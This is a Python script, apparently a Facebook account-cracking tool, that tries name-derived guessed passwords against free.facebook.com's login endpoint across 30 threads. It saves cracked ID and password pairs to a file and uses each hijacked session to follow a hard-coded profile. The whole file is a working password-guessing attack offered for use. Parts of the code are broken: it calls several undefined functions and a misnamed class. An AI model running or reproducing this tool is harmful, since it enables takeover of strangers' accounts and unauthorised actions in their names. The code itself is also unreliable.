#!/usr/bin/python3
#FUCKED BY HAMID MEER HAMII
#BAAP KO FEEL KR KASHIF SASTY SHPER
import os
try:
    import requests
except ImportError:
    print('\n [✓] installing requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [✓] installing futures !...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [✓] installing bs4 !...\n')
    os.system('pip install bs4')

import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
from concurrent.futures import ThreadPoolExecutor as Jadussb
from datetime import datetime
from bs4 import BeautifulSoup


ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
P = '\x1b[1;97m' # 
M = '\033[1;31m' # 
H = '\033[1;32m' # 
K = '\x1b[1;97m' # 
B = '\x1b[1;97m' # 
U = '\x1b[1;97m' # 
O = '\x1b[1;97m' # 
N = '\x1b[0m'    # 
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,fuck,pwBaru=[],[],[]
ok = []
cp = []
id = []
user = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://free.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

logo=""" ___________ MR JADUGAR____________
____________________________________________
github   : not found
Facebook : Muhammad Kashif
YouTube  : Mr Jadugar Gamer
Whatsapp : +923475353500
-----------------------------------------------------
       \x1b[1;92m  USE FLIGHT MOOD Every 10 minutes
-----------------------------------------------------"""

def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    nt('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mJadu_OK.txt' % (H, P, str(len(ok))))
	    #print(' \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mJadu_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPress enter to back Jadu Menu ")
	    Jadu()

def Kashif():
    os.system('clear')
    print(logo)
    ipm = requests.get(url_ip).json()
    todz = ''
    IP = ipm['origin']
    print
    print(' [1] Start File Cloning')
    print(' [2] exit ')
    print('')
    _Jadu___ = input(' [?] Choose option : ')
    if _Jadu___ in ('1', '01'):
        __xxx__().Jadux(id)
    if _Jadu___ in ('E', 'ee'):
        pass


class __xx__:
    def __init__(self):
        self.id = []
    def Jadux(self,id):
        os.system("clear")
        print(logo)
        self.cnt = input('Put File Name : ')
        self.id = open(self.cnt).read().splitlines()
        os.system('clear')
        print(logo)
        print("")
        ___worldwide___ = ('y')
        if ___worldwide___ in ('yes','Yes','Y', 'y'):
            self.__pler__()
        else:
            prnt(' [!] Choose Correct One');
            self.Jadux(id)
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f'\r \033[1;92m[Jadu] {loop}/{len(self.id)} OK={len(ok)}-CP={len(cp)} '),
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                session=requests.Session()
                header = {
                    "Host":cebok,
                    "upgrade-insecure-requests":"1",
                    "user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "dnt":"1",
                    "x-requested-with":"mark.via.gp",
                    "sec-fetch-site":"same-origin",
                    "sec-fetch-mode":"cors",
                    "sec-fetch-user":"empty",
                    "sec-fetch-dest":"document",
                    "referer":"https://free.facebook.com/",
                    "accept-encoding":"gzip, deflate br",

                }
                r = session.get(f"https://{cebok}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)
                das = {
                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
                    "uid":user,
                    "flow":"login_no_pin",
                    "pass":pw,
                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"
                }
                header1 = {
                    "Host":cebok,
                    "cache-control":"max-age=0",
                    "upgrade-insecure-requests":"1",
                    "origin":"https://"+cebok,
                    "content-type":"application/x-www-form-urlencoded",
                    "user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "x-requested-with":"XMLHttpRequest",
                    "sec-fetch-site":"same-origin",
                    "sec-fetch-mode":"cors",
                    "sec-fetch-user":"empty",
                    "sec-fetch-dest":"document",
                    "referer":"https://"+cebok+"/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",
                    "accept-encoding":"gzip, deflate br",
                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
                }
                po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
                if 'c_user' in session.cookies.get_dict():
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    print(f"\r{H} [Jadu-ok] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('Jadu-OK.txt' , 'a').write('%s\n' % wrt)
                    self.follow(session,coki)
                    break
                else:
                    continue
            loop+=1
        except:
            self.__metode__(user, pw, cebok)

    def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://www.facebook.com/okiew.you', cookies={'cookie': coki}).text, 'html.parser')
        get = r.find('a', string='Ikuti').get('href')
        session.get(('https://free.facebook.com' + str(get)), cookies={'cookie': coki}).text
                
    def __pler__(self):
        print('[1] Crack With 2 pass Fast ')
        chi = input('\n [?] Choose: ')
        if chi == '':
            print('\nSelect Correct One')
            self.__pler__()
        elif chi in ('1', '01'):
            os.system("clear")
            print(logo)
            print('\033[1;37m Total IDs : %s ' % len(self.id))
            print('\033[1;37m Cracking  EnjoY...')
            print(47*"-")
            with Jadussb(max_workers=30) as ssbworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+xz[1], xz[0]+"123"]
                        else:
                        	pwx = [name, xz[0]+xz[1], xz[0]+"123"]
                        ssbworld.submit(self.__metode__, uid, pwx, "free.facebook.com")
                    except:
                        pass
            hasl(ok,cp)
        elif chi in ('2', '02'):
            os.system("clear")
            print(logo)
            p1 = input(' 1 : ')
            os.system("clear")
            print(logo)
            pri('\033[1;37m Total IDs : %s ' % len(self.id))
            #print('\033[1;37m Cracking Started...')
            print(47*"-")
            with Jadussb(max_workers=30) as ssbworld:
                #for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [p1]
                        else:
                            pwx = [p1]
                        ssbworld.submit(self.__metode__, uid, pwx, "free.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        else:
            print('\n Select Valid One')
            self.__pler__()

class load:
    def __init__(self):
        _ = ''
        __ = int('30')
        ___ = int('0')
        __ -= 1
        ___ += 1
        for t in range(int("1")):
            print('\r Please Wait ....')
            sys.stdout.flush()
            time.sleep(0.1)
        print('\n')

Kashif()

